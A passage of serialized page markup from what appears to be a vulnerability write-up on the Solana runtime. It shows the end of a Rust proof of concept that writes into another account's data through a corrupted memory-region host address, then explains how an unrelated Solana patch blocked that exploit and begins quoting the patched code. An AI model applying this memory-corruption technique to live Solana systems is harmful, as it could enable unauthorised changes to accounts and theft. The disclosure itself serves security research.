\"]}],[\"$\",\"span\",\"code-segement411\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement412\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement413\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement414\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[56]}],[\"$\",\"span\",\"code-segement416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement417\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--57\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[57]}],[\"$\",\"span\",\"code-segement420\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement421\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement422\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement423\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--58\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[58]}],[\"$\",\"span\",\"code-segement425\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement426\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement427\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement428\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--59\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[59]}],[\"$\",\"span\",\"code-segement430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            accounts\"]}],[\"$\",\"span\",\"code-segement431\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement432\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement433\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement434\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement435\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement436\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement437\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement438\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement439\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--60\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[60]}],[\"$\",\"span\",\"code-segement441\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement442\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement443\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement444\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--61\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[61]}],[\"$\",\"span\",\"code-segement446\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement447\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement448\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement449\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement450\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement451\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--62\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[62]}],[\"$\",\"span\",\"code-segement453\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement454\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement455\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement456\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement457\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--63\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[63]}],\"\\n\",[\"$\",\"span\",\"line-number--64\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[64]}],[\"$\",\"span\",\"code-segement461\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement462\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// this will write to accounts[1].data due to corrupted region.host_addr\"]}],[\"$\",\"span\",\"code-segement463\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--65\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[65]}],[\"$\",\"span\",\"code-segement465\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}],[\"$\",\"span\",\"code-segement466\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement467\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement468\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement469\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement470\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement471\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement472\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement473\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement474\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement475\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement476\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"10\"]}],[\"$\",\"span\",\"code-segement477\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement478\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement479\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement480\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement481\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement482\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement483\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--66\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[66]}],[\"$\",\"span\",\"code-segement485\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement486\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement487\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement488\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement489\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement490\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement491\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--67\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[67]}],[\"$\",\"span\",\"code-segement493\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement494\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-102\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"However, once we pulled the latest code, our PoC stopped working. How so?\"}],\"\\n\",[\"$\",\"p\",\"p-103\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Coincidentally, Solana was actively patching another bug while we were developing our PoC. We originally thought the patch was irrelevant to our bug, but it ended up blocking our first exploit.\"}],\"\\n\",[\"$\",\"p\",\"p-104\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The patch addresses a mistake where \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" states are not updated properly across CPIs. That fix landed in \",[\"$\",\"a\",\"a-0\",{\"className\":\"text-accent1 hover:text-indigo-300 underline decoration-1 underline-offset-4\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"https://github.com/solana-labs/solana/pull/32649/commits/9788a4efffdb1436bdcb5f0891111398d5a4da0b\",\"children\":\"this commit\"}],\". The main addition of the patch is shown below.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-14\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"update_caller_account_perms\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    memory_mapping\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryMapping\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    caller_account\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    callee_account\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"BorrowedAccount\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'_\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    is_loader_deprecated\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        original_data_len\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        vm_data_addr\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"..\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" caller_account\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],\"\\n\",[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data_region \"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"account_data_region\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"memory_mapping\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_data_addr\"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token 